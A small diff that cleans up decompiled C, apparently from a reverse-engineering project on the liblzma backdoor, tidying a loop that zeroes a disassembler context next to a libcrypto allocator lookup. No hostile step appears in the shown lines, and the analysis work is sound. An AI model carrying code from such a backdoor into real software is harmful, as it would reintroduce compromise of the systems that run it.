@@ -44,7 +44,7 @@ BOOL find_link_map_l_audit_any_plt_bitmask
     ctx_zero_cursor = &insn_ctx;
     for (ctx_clear_idx = 0x16; ctx_clear_idx != 0; ctx_clear_idx = ctx_clear_idx + -1) {
       *(u32 *)&ctx_zero_cursor->instruction = 0;
-      ctx_zero_cursor = (dasm_ctx_t *)((long)ctx_zero_cursor + (ulong)bit_test_register * -8 + 4);
+      ctx_zero_cursor = (dasm_ctx_t *)((u8 *)ctx_zero_cursor + 4);
     }
     libcrypto_allocator = get_lzma_allocator();
     libcrypto_allocator->opaque = data->cached_elf_handles->libcrypto;
